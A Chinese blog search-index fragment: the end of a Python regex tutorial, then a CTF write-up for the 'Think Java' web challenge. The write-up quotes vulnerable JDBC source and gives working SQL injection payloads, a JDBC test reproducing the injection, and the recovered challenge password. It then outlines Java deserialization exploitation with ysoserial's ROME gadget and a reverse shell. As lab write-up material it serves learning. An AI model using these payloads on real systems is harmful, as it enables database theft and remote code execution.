</blockquote>
<p>2.5 字符集：[]</p>
<blockquote>
<p>[a-zA-Z0-9_] : 等价于\w<br>[0-9a-zA-Z._] : 匹配数字、字母、. 和 _</p>
</blockquote>
<p>2.6 开始符和结尾符：^、$</p>
<blockquote>
<p>^\d&nbsp;:以数字开始<br>\w$&nbsp;:以字母结尾<br>^[a-zA-Z][0-9a-zA-Z_]*:匹配python的合法变量</p>
</blockquote>
<p>2.7 分组:()<br>2.7.1  捕获组 </p>
<blockquote>
<p>(^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+.\w+ : 匹配邮箱用户名<br><img src="/2018/05/05/%E6%AD%A3%E5%88%99%E5%AD%A6%E4%B9%A0/1.jpg" alt="a"> </p>
</blockquote>
<p>2.7.2 非捕获组</p>
<blockquote>
<p>(^[0-9a-zA-Z]\w{5,17}@[0-9a-zA-Z]+.(?:net|com|top|cn))&nbsp;:&nbsp;捕获指定后缀名的邮箱用户名<br>（?:\d+.){3}\d&nbsp;:&nbsp;匹配IP</p>
</blockquote>
<h3 id="3-python中的re模块"><a href="#3-python中的re模块" class="headerlink" title="3.python中的re模块"></a>3.python中的re模块</h3><p>3.1   re.match函数</p>
<blockquote>
<p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。<br>函数语法：re.match(pattern, string, flags=0)   </p>
</blockquote>
<p>3.1.1   参数说明：</p>
<blockquote>
<p>pattern：匹配的正则表达式<br>string:要匹配的字符串<br>flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</p>
</blockquote>
<p>3.1.2：<br>我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。   </p>
<blockquote>
<p>匹配对象的方法：<br>group(num=0)：匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。<br>groups()：返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</p>
</blockquote>
<p>3.2   re.search函数</p>
<blockquote>
<p>re.search：扫描整个字符串并返回第一个成功的匹配。<br>函数语法：re.search(pattern, string, flags=0)</p>
</blockquote>
<p>3.3   re.match与re.search的区别</p>
<blockquote>
<p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p>
</blockquote>
<p>3.4   检索和替换</p>
<blockquote>
<p>Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。<br>语法：re.sub(pattern, repl, string, count=0, flags=0)</p>
</blockquote>
<p>3.4.1  参数说明</p>
<blockquote>
<p>pattern : 正则中的模式字符串。<br>repl : 替换的字符串，也可为一个函数。<br>string : 要被查找替换的原始字符串。<br>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</p>
</blockquote>
<p>3.5   re.compile函数</p>
<blockquote>
<p>compile 函数用于编译正则表达式，生成一个正则表达（ Pattern ）对象，供 match() 和 search() 这两个函数使用。<br>语法格式为：re.compile(pattern[, flags])</p>
</blockquote>
<p>3.5.1   参数说明</p>
<blockquote>
<p>pattern : 一个字符串形式的正则表达式<br>flags : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为：<br>1.re.I 忽略大小写<br>2.re.L 表示特殊字符集 \w, \W, \b, \B, \s, \S 依赖于当前环境<br>3.re.M 多行模式<br>4.re.S 即为 . 并且包括换行符在内的任意字符（. 不包括换行符）<br>5.re.U 表示特殊字符集 \w, \W, \b, \B, \d, \D, \s, \S 依赖于    Unicode 字符属性数据库<br>6.re.X 为了增加可读性，忽略空格和 # 后面的注释   </p>
</blockquote>
<p>3.6   re.findall</p>
<blockquote>
<p>在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。<br>注意： match 和 search 是匹配一次 findall 匹配所有。<br>函数语法：findall(string, pos, endpos)</p>
</blockquote>
<p>3.6.1   参数说明</p>
<blockquote>
<p>string : 待匹配的字符串。<br>pos : 可选参数，指定字符串的起始位置，默认为 0。<br>endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。</p>
</blockquote>
<p>3.7   re.finditer</p>
<blockquote>
<p>和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。<br>函数语法：re.finditer(pattern, string, flags=0)   </p>
</blockquote>
<p>3.8   re.split</p>
<blockquote>
<p>split 方法按照能够匹配的子串将字符串分割后返回列表<br>函数语法：re.split(pattern, string[, maxsplit=0, flags=0])</p>
</blockquote>
<p>3.8.1  参数说明</p>
<blockquote>
<p>maxsplit：分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。   </p>
</blockquote>
<h3 id="4-正则表达式对象"><a href="#4-正则表达式对象" class="headerlink" title="4.正则表达式对象"></a>4.正则表达式对象</h3><p>4.1   re.RegexObject</p>
<blockquote>
<p>re.compile() 返回 RegexObject 对象。</p>
</blockquote>
<p>4.2   re.MatchObject </p>
<blockquote>
<p>group() 返回被 RE 匹配的字符串。<br>start() 返回匹配开始的位置<br>end() 返回匹配结束的位置<br>span() 返回一个元组包含匹配 (开始,结束) 的位置    </p>
</blockquote>
<h3 id="5-结语"><a href="#5-结语" class="headerlink" title="5.结语"></a>5.结语</h3><p>正则理解起来不算难，看的话效果不太大，实践出真理。</p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯-朱雀组-Web复现wp</title>
    <url>/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/</url>
    <content><![CDATA[<h3 id="Think-Java"><a href="#Think-Java" class="headerlink" title="Think Java"></a>Think Java</h3><p>本题花时间也比较多，复现的时候遇到的坑也比较多，以下是解题方法与细节理解。</p>
<h4 id="0x01-源代码分析"><a href="#0x01-源代码分析" class="headerlink" title="0x01 源代码分析"></a>0x01 源代码分析</h4><p>根据给的文件可以发现存在sql注入，dbName可控，此外在Test.class中发现了swagger，访问后发现开放了相关接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.abc.core.sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DatabaseMetaData;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SqlDict</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SqlDict</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">        Connection conn = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">            <span class="keyword">if</span> (dbName != <span class="keyword">null</span> &amp;&amp; !dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                dbName = <span class="string">"jdbc:mysql://mysqldbserver:3306/"</span> + dbName;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dbName = <span class="string">"jdbc:mysql://mysqldbserver:3306/myapp"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user == <span class="keyword">null</span> || dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                user = <span class="string">"root"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pass == <span class="keyword">null</span> || dbName.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">                pass = <span class="string">"abc@12345"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">            var5.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">            var6.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title">getTableData</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">        List&lt;Table&gt; Tables = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        Connection conn = getConnection(dbName, user, pass);</span><br><span class="line">        String TableName = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Statement stmt = conn.createStatement();</span><br><span class="line">            DatabaseMetaData metaData = conn.getMetaData();</span><br><span class="line">            ResultSet tableNames = metaData.getTables((String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, <span class="keyword">new</span> String[]&#123;<span class="string">"TABLE"</span>&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">                TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">                Table table = <span class="keyword">new</span> Table();</span><br><span class="line">                String sql = <span class="string">"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '"</span> + dbName + <span class="string">"' and table_name='"</span> + TableName + <span class="string">"';"</span>;</span><br><span class="line">                ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                    table.setTableDescribe(rs.getString(<span class="string">"TABLE_COMMENT"</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                table.setTableName(TableName);</span><br><span class="line">                ResultSet data = metaData.getColumns(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName, <span class="string">""</span>);</span><br><span class="line">                ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName);</span><br><span class="line"></span><br><span class="line">                String PK;</span><br><span class="line">                <span class="keyword">for</span>(PK = <span class="string">""</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(data.next()) &#123;</span><br><span class="line">                    Row row = <span class="keyword">new</span> Row(data.getString(<span class="string">"COLUMN_NAME"</span>), data.getString(<span class="string">"TYPE_NAME"</span>), data.getString(<span class="string">"COLUMN_DEF"</span>), data.getString(<span class="string">"NULLABLE"</span>).equals(<span class="string">"1"</span>) ? <span class="string">"YES"</span> : <span class="string">"NO"</span>, data.getString(<span class="string">"IS_AUTOINCREMENT"</span>), data.getString(<span class="string">"REMARKS"</span>), data.getString(<span class="string">"COLUMN_NAME"</span>).equals(PK) ? <span class="string">"true"</span> : <span class="keyword">null</span>, data.getString(<span class="string">"COLUMN_SIZE"</span>));</span><br><span class="line">                    table.list.add(row);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Tables.add(table);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">            var16.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Tables;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关于这个注入点，需要加#再闭合，或者通过?加个id再闭合(如下)，对此我很是不解，通过赵师傅的指点与写jdbc代码测试才得以搞明白。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">myapp?id=<span class="number">1</span><span class="string">' union select user()#</span></span><br><span class="line"><span class="string">myapp#'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">user</span>()<span class="comment">#</span></span></span><br></pre></td></tr></table></figure>

<p>我的测试代码如下(可以理解为本题的简化版本)，grade为本地的一个数据库，选择了其中的admins表：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zed.jdbc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcDemo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1、注册驱动</span></span><br><span class="line">        DriverManager.registerDriver(<span class="keyword">new</span> com.mysql.jdbc.Driver());</span><br><span class="line">        <span class="comment">//2、获取链接</span></span><br><span class="line">        String dbname = <span class="string">"grade?id=1' union select user()#"</span>;</span><br><span class="line">        <span class="comment">//或者 String dbname = "grade#' union select user()#";</span></span><br><span class="line">        <span class="comment">//连接数据库</span></span><br><span class="line">        Connection conn = DriverManager.getConnection(<span class="string">"jdbc:mysql://localhost:3306/"</span>+dbname,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        <span class="comment">//3、获取操作数据库的预处理对象</span></span><br><span class="line">        PreparedStatement pstm = conn.prepareStatement(<span class="string">"Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where"</span> +</span><br><span class="line">                <span class="string">"  table_schema = '"</span> + dbname + <span class="string">"' and table_name='admins';"</span>);</span><br><span class="line">        <span class="comment">//4、执行sql语句，得到结果集</span></span><br><span class="line">        ResultSet res = pstm.executeQuery();</span><br><span class="line">        <span class="comment">//5、遍历结果集</span></span><br><span class="line">        <span class="keyword">while</span> (res.next())&#123;</span><br><span class="line">            System.out.println(res.getString(<span class="string">"TABLE_COMMENT"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//6、释放资源</span></span><br><span class="line">        res.close();</span><br><span class="line">        pstm.close();</span><br><span class="line">        conn.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x02测试代码分析："><a href="#0x02测试代码分析：" class="headerlink" title="0x02测试代码分析："></a>0x02测试代码分析：</h4><p>在JDBC中，连接数据库的时候采用了?来进行参数传递，如果但是不会影响数据库是否成功连接。例如：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://localhost:3306/数据库名?user=用户名<span class="variable">&amp;password</span>=密码<span class="variable">&amp;useUnicode</span>=true<span class="variable">&amp;characterEncoding</span>=utf-8<span class="variable">&amp;serverTimezone</span>=GMT</span><br></pre></td></tr></table></figure>

<p>?后面的字符串都会被当作参数来进行传递，所以当 <code>dbname=&quot;grade?id=1&#39; union select user()#&quot;</code> 时，</p>
<p><code>1&#39; union select user()#</code> 都被当做id的值，但是不影响数据库的连接，然后在下面执行sql语句的时候  <code>union select user()#</code> 都作为了sql语句执行，达成了sql注入。使用#同理。</p>
<p>最终输入在swagger-ui.html的/common/test/sqlDict接口中输入<code>myapp#&#39; union select pwd from user#</code>获得密码为 admin@Rrrr_ctf_asde 。</p>
<h4 id="0x03登录获取token"><a href="#0x03登录获取token" class="headerlink" title="0x03登录获取token"></a>0x03登录获取token</h4><p>在/common/user/login中登录获取到Bearer。</p>
<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/login.png" alt="1590733597113">Bearer是用户json数据序列化的结果，将Bearer后面的字符串base64decode的结果如下，明显的java序列化后的格式，这里就可能出现反序列化的漏洞，既然是登录用的，那么就在/common/user/current中应该会触发反序列化，那么在这个接口中的Authorization中输入这一串data，然后Try it out!抓包。</p>
<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/serialize.png" alt="1590733804094"></p>
<h4 id="0x04反序列化利用的环境配置"><a href="#0x04反序列化利用的环境配置" class="headerlink" title="0x04反序列化利用的环境配置"></a>0x04反序列化利用的环境配置</h4><p>先在burp中安装  Java Deserialization Scanner插件，该插件在burp的BApp Store可以找到。然后配置ysoserial，先上<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">github</a>下载相关源代码，再使用 <code>mvn clean package -DskipTests</code> 进行编译，最后在burp中的 Java Deserialization Scanner插件下配置路径，例如：</p>
<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/ysoserial.png" alt="1590734238883"></p>
<h4 id="0x05反序列化利用-amp-amp-get-flag"><a href="#0x05反序列化利用-amp-amp-get-flag" class="headerlink" title="0x05反序列化利用&amp;&amp;get flag"></a>0x05反序列化利用&amp;&amp;get flag</h4><p>由于复现是在buuoj下复现的，靶机都处于内网环境，所以先开个小号去申请个内网服务器用来接收shell。</p>
<p>在burp中，将抓到的包发送到装好的插件中</p>
<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/SendRequestToDS.png" alt="1590734455390"></p>
<p>将Bearer后的字符串 Set Insertion Point，然后Attack(Base64)，在右边可以看到可利用的ROME。</p>
<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/serializePoc.png" alt="1590734607131"></p>
<p>将当前包发送到Exploiting</p>
<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/serializeExp.png" alt="1590734722286"></p>
<p>然后构造payload执行，ip端口为buuoj中申请的内网靶机的ip与监听的端口。</p>
<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/exp.png" alt="1590734801498"></p>
<p>最后成功接收到flag</p>
<p><img src="/2020/05/29/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80%E7%BB%84-Web%E5%A4%8D%E7%8E%B0wp/flag.png" alt="1590734861991"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
